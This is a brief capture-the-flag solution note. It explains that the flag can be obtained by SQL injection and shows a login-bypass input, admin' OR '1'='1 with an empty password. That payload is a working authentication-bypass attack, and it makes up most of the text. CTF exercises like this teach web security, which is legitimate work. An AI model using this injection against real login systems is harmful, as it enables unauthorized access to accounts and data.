To obtain the flag you could use some simple SQL injection.
Something similar to this would do.
```bash
admin: admin' OR '1'='1
password: ' ' 
```